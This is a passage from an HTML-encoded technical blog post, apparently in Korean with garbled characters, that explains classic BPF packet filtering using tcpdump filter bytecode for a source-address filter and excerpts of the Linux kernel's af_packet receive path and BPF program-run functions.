&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ldh&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jeq&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x800&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;       &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jeq&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1010101&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jeq&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x806&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;005&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jeq&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8035&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;       &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jeq&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1010101&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;262144&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;      &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;ì„&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Workspace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000c&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000001a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01010101&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000806&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00008035&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000001c&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01010101&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00040000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì½”ë“œë“¤ì´ ë“¤ì–´ê°€ëŠ” ì»¤ë„ ì½”ë“œëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;net/packet/af_packet.c&lt;/code&gt;ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;packet_rcv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sk_buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net_device&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		      &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net_device&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orig_dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_ll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;po&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb_head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skb_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snaplen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_drop_n_account&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PACKET_LOOPBACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;af_packet_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;po&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt_sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net_eq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev_net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;run_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snaplen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sk_buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			       &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			       &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sk_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;rcu_read_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcu_dereference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sk_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_run_clear_cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;rcu_read_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bpf_prog_run_clear_cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sk_buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cb_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_skb_cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unlikely&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cb_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cb_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_SKB_CB_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;preempt_disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_PROG_RUN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;preempt_enable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BPF_PROG_RUN(prog, ctx)	({				\
	u32 ret;						\
	cant_sleep();						\
	if (static_branch_unlikely(&amp;amp;bpf_stats_enabled_key)) {	\
		struct bpf_prog_stats *stats;			\
		u64 start = sched_clock();			\
		ret = (*(prog)-&amp;gt;bpf_func)(ctx, (prog)-&amp;gt;insnsi);	\
